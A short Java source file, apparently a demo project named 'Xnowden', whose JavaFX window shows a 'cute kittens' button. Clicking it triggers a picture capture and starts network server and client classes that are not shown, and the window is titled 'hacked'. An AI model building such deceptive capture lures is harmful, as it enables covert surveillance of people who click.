package xnowden;

import java.awt.AWTException;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Application;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.layout.StackPane;
import javafx.stage.Stage;
import network.Cliente;
import network.Server;

public class Xnowden extends Application {

    Automato aut;
    Server ser;
    Cliente cli;

    @Override
    public void start(Stage primaryStage) {
        Button btn = new Button();
        try {
            aut = new Automato();
        } catch (AWTException ex) {
            Logger.getLogger(Xnowden.class.getName()).log(Level.SEVERE, null, ex);
        }

        btn.setText("Gatinhos Fofinhos");
        btn.setOnAction(new EventHandler<ActionEvent>() {

            @Override
            public void handle(ActionEvent event) {
                try {
                    aut.takePicture();
                    ser = new Server();
                    cli = new Cliente();
                } catch (IOException ex) {
                    Logger.getLogger(Xnowden.class.getName()).log(Level.SEVERE, null, ex);
                } catch (AWTException ex) {
                    Logger.getLogger(Xnowden.class.getName()).log(Level.SEVERE, null, ex);
                }

            }
        });

        StackPane root = new StackPane();
        root.getChildren().add(btn);

        Scene scene = new Scene(root, 300, 250);

        primaryStage.setTitle("Hackeado");
        primaryStage.setScene(scene);
        primaryStage.show();
    }

    public static void main(String[] args) {
        launch(args);
    }

}
